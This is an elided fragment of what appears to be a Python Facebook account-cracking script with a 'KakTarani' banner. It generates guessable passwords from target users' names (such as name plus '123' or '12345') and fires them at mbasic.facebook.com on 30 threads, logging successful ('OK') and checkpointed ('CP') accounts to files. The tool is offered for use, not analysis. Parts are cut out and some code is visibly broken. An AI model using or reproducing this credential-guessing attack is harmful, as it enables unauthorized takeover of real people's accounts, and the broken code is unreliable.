...
from concurrent.futures import ThreadPoolExecutor as meithunKakTarani
...
|_  ||_  _|        [  |  _ |  _   _  |                               (_)  
  ...
  |  __'.   `'_\ :  | '' <     | |   `'_\ : [ `/'`\]`'_\ : [ `.-. | [  |  
 _| |  \ \_ // | |, | |`\ \   _| |_  // | |, | |    // | |, | | | |  | |  
|____||____|\'-;__/[__|  \_] |_____| \'-;__/[___]   \'-;__/[___||__][___] 
                                                                          
─────────────────────── 
\033[1;93m=================================
\033[1;97m Owner  : KAKTARANI :/
\033[1;97m GitHub : KakTarani :/
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mKakTarani_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mKakTarani_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[KakTarani] {loop} | {len(self.id)} [ok] < > [{len(ok)}] < > [cp] < > [{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with meithunKakTarani(max_workers=30) as KakTaraniworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        KakTaraniworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('Y', 'y'):
